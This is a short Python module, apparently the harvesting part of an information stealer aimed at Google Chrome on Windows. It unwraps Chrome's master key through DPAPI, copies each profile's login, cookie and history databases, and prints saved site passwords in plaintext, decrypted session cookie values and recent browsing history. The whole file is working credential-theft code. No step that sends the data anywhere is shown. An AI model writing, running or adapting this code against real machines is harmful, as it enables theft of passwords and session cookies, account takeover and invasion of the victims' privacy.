import base64
import json
import os
import pathlib
import shutil
import sqlite3
import tempfile

import win32crypt
from Crypto.Cipher import AES

UA = pathlib.Path(os.getenv('LOCALAPPDATA')) / 'Google' / 'Chrome' / 'User Data'


def _key():
    ls = UA / 'Local State'
    if not ls.exists():
        return None
    raw = base64.b64decode(json.loads(ls.read_text())['os_crypt']['encrypted_key'])[5:]
    try:
        return win32crypt.CryptUnprotectData(raw, None, None, None, 0)[1]
    except Exception:
        return None


def _dec(val, key):
    if not val:
        return ''
    try:
        if val[:3] in (b'v10', b'v11'):
            n, c = val[3:15], val[15:]
            return AES.new(key, AES.MODE_GCM, n).decrypt_and_verify(c[:-16], c[-16:]).decode('utf-8', 'replace')
        return win32crypt.CryptUnprotectData(val, None, None, None, 0)[1].decode('utf-8', 'replace')
    except Exception:
        return ''


def _q(db, sql):
    if not db.exists():
        return []
    t = pathlib.Path(tempfile.gettempdir()) / f'{db.stem}.db'
    try:
        shutil.copy2(db, t)
        c = sqlite3.connect(t)
        r = c.execute(sql).fetchall()
        c.close()
        t.unlink()
        return r
    except Exception:
        return []


def passwords():
    k = _key()
    if not k:
        return 'no key (close Chrome and retry)'
    out = []
    for prof in UA.glob('*'):
        if not (prof / 'Login Data').exists():
            continue
        for url, user, pw in _q(prof / 'Login Data',
                                'SELECT origin_url, username_value, password_value FROM logins'):
            p = _dec(pw, k)
            if user or p:
                out.append(f'{url}\n  {user} : {p}')
    return '\n'.join(out) or '(none)'


def cookies():
    k = _key()
    if not k:
        return 'no key'
    out = []
    for prof in UA.glob('*'):
        if not (prof / 'Network' / 'Cookies').exists():
            continue
        for host, name, val in _q(prof / 'Network' / 'Cookies',
                                  'SELECT host_key, name, encrypted_value FROM cookies LIMIT 300'):
            out.append(f'{host}\t{name}\t{_dec(val, k)[:60]}')
    return '\n'.join(out) or '(none)'


def history(n=80):
    out = []
    for prof in UA.glob('*'):
        for url, title, cnt in _q(prof / 'History',
                                  f'SELECT url, title, visit_count FROM urls '
                                  f'ORDER BY last_visit_time DESC LIMIT {n}'):
            out.append(f'[{cnt}] {title} — {url}')
    return '\n'.join(out) or '(none)'